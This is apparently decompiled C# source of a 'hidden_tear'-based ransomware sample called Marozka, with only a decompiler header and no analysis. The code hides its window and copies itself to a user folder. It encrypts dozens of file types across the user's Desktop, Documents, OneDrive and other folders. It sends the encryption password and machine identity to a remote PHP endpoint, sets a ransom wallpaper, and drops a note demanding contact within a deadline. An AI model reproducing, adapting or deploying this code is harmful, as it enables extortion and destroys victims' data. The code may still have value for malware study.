// Decompiled with JetBrains decompiler
// Type: hidden_tear.Form1
// Assembly: Marozka, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4899D879-7C42-4D31-9193-A0A873394810
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Agent.gen-7cdd7e30c7091fd2fa3e879dd70087517412a165bf14c4ea4fd354337f22c415.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace hidden_tear
{
  public class Form1 : Form
  {
    private string targetURL = "https://hide-hide-hide.000webhostapp.com/write.php?info=";
    private string userName = Environment.UserName;
    private string computerName = Environment.MachineName.ToString();
    private string userDir = "C:\\";
    private string backgroundImageUrl = "https://hide-hide-hide.000webhostapp.com/hide/Marozka.jpg";
    private IContainer components = (IContainer) null;

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint action,
      uint uParam,
      string vParam,
      uint winIni);

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.startAction();
    }

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
        createParams.ExStyle |= 128;
        return createParams;
      }
    }

    private void Form_Shown(object sender, EventArgs e)
    {
      this.Visible = false;
      this.Opacity = 100.0;
    }

    public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] numArray = (byte[]) null;
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
      }
      return numArray;
    }

    public string CreatePassword(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()".Length)]);
      return stringBuilder.ToString();
    }

    public void SendPassword(string password)
    {
      try
      {
        new WebClient().DownloadString(this.targetURL + (this.computerName + "-" + this.userName + " " + password ?? ""));
      }
      catch (Exception ex)
      {
      }
    }

    public void EncryptFile(string file, string password)
    {
      byte[] bytesToBeEncrypted = System.IO.File.ReadAllBytes(file);
      byte[] bytes1 = Encoding.UTF8.GetBytes(password);
      byte[] hash = SHA256.Create().ComputeHash(bytes1);
      byte[] bytes2 = this.AES_Encrypt(bytesToBeEncrypted, hash);
      string path = this.userDir + ("Users\\" + this.userName + "\\Desktop\\HOW TO DECRYPT FILES.txt.Marozka");
      if (System.IO.File.Exists(path))
        System.IO.File.Delete(path);
      System.IO.File.WriteAllBytes(file, bytes2);
      System.IO.File.Move(file, file + ".Marozka");
    }

    public void encryptDirectory(string location, string password)
    {
      try
      {
        string[] source = new string[68]
        {
          ".txt",
          ".jar",
          ".exe",
          ".dat",
          ".contact",
          ".settings",
          ".doc",
          ".docx",
          ".xls",
          ".xlsx",
          ".ppt",
          ".pptx",
          ".odt",
          ".jpg",
          ".png",
          ".csv",
          ".py",
          ".sql",
          ".mdb",
          ".sln",
          ".php",
          ".asp",
          ".aspx",
          ".html",
          ".htm",
          ".xml",
          ".psd",
          ".pdf",
          ".dll",
          ".c",
          ".cs",
          ".mp3",
          ".mp4",
          ".f3d",
          ".dwg",
          ".cpp",
          ".zip",
          ".rar",
          ".mov",
          ".rtf",
          ".bmp",
          ".mkv",
          ".avi",
          ".apk",
          ".lnk",
          ".iso",
          ".7-zip",
          ".ace",
          ".arj",
          ".bz2",
          ".cab",
          ".gzip",
          ".lzh",
          ".tar",
          ".uue",
          ".xz",
          ".z",
          ".001",
          ".mpeg",
          ".mp3",
          ".mpg",
          ".core",
          ".crproj",
          ".pdb",
          ".ico",
          ".pas",
          ".db",
          ".torrent"
        };
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        for (int index = 0; index < files.Length; ++index)
        {
          string extension = Path.GetExtension(files[index]);
          if (((IEnumerable<string>) source).Contains<string>(extension))
            this.EncryptFile(files[index], password);
        }
        for (int index = 0; index < directories.Length; ++index)
          this.encryptDirectory(directories[index], password);
      }
      catch (Exception ex)
      {
      }
    }

    public void MoveVirus()
    {
      string path = this.userDir + this.userName + "\\Rand123";
      string str1 = this.userDir + this.userName + "\\Rand123\\local.exe";
      if (!Directory.Exists(path))
        Directory.CreateDirectory(path);
      else if (System.IO.File.Exists(str1))
        System.IO.File.Delete(str1);
      string str2 = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
      System.IO.File.Move(Directory.GetCurrentDirectory() + str2, str1);
    }

    public static bool CheckForInternetConnection()
    {
      try
      {
        using (WebClient webClient = new WebClient())
        {
          using (webClient.OpenRead("https://www.google.com"))
            return true;
        }
      }
      catch
      {
        return false;
      }
    }

    public void startAction()
    {
      this.MoveVirus();
      string password = this.CreatePassword(15);
      this.Directory_Settings_Sending(password);
      this.messageCreator();
      string path = this.userDir + this.userName + "\\ransom.jpg";
      bool flag;
      do
      {
        flag = Form1.CheckForInternetConnection();
        if (flag)
        {
          this.SetWallpaperFromWeb(this.backgroundImageUrl, path);
          this.SendPassword(password);
        }
      }
      while (!flag);
      Application.Exit();
    }

    public void Directory_Settings_Sending(string password)
    {
      string str = "Users\\";
      string location1 = this.userDir + str + this.userName + "\\Desktop";
      string location2 = this.userDir + str + this.userName + "\\Links";
      string location3 = this.userDir + str + this.userName + "\\Contacts";
      string location4 = this.userDir + str + this.userName + "\\Desktop";
      string location5 = this.userDir + str + this.userName + "\\Documents";
      string location6 = this.userDir + str + this.userName + "\\Downloads";
      string location7 = this.userDir + str + this.userName + "\\Pictures";
      string location8 = this.userDir + str + this.userName + "\\Music";
      string location9 = this.userDir + str + this.userName + "\\OneDrive";
      string location10 = this.userDir + str + this.userName + "\\Saved Games";
      string location11 = this.userDir + str + this.userName + "\\Favorites";
      string location12 = this.userDir + str + this.userName + "\\Searches";
      string location13 = this.userDir + str + this.userName + "\\Videos";
      this.encryptDirectory(location1, password);
      this.encryptDirectory(location2, password);
      this.encryptDirectory(location3, password);
      this.encryptDirectory(location4, password);
      this.encryptDirectory(location5, password);
      this.encryptDirectory(location6, password);
      this.encryptDirectory(location7, password);
      this.encryptDirectory(location8, password);
      this.encryptDirectory(location9, password);
      this.encryptDirectory(location10, password);
      this.encryptDirectory(location11, password);
      this.encryptDirectory(location12, password);
      this.encryptDirectory(location13, password);
    }

    public void messageCreator()
    {
      string path = this.userDir + "Users\\" + this.userName + "\\Desktop\\HOW TO DECRYPT FILES.txt";
      string str = this.computerName + "-" + this.userName;
      string[] contents = new string[13]
      {
        "All your information (documents, databases, backups and other files) this computer was encrypted using the most cryptographic algorithms.",
        "All encrypted files are formatted .Marozka.",
        "This form files '.Marozka' is a joint development ENGLISH and RUSSIAN Hackers.",
        "You can only recover files using a decryptor and password, which, in turn, only we know.",
        "It is impossible to pick it up.",
        "Reinstalling the OS will not change anything.",
        "No system administrator in the world can solve this problem without knowing the password",
        "In no case do not modify the files! But if you want, then make a backup.",
        "Drop us an email at the address silena.berillo@gmail.com",
        "if within 12 hours you do not respond to hto2018@yandex.ru for further insertions",
        "You have 24 hours left. If they are not decrypted then after 24 hours they will be removed!!!",
        "You can also decrypt files automatically on our website",
        " https://proverka.host"
      };
      System.IO.File.WriteAllLines(path, contents);
    }

    public void SetWallpaper(string path) => Form1.SystemParametersInfo(20U, 0U, path, 3U);

    private void SetWallpaperFromWeb(string url, string path)
    {
      try
      {
        new WebClient().DownloadFile(new Uri(url), path);
        this.SetWallpaper(path);
      }
      catch (Exception ex)
      {
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(124, 53);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form1);
      this.Text = "hidden tear";
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }
  }
}
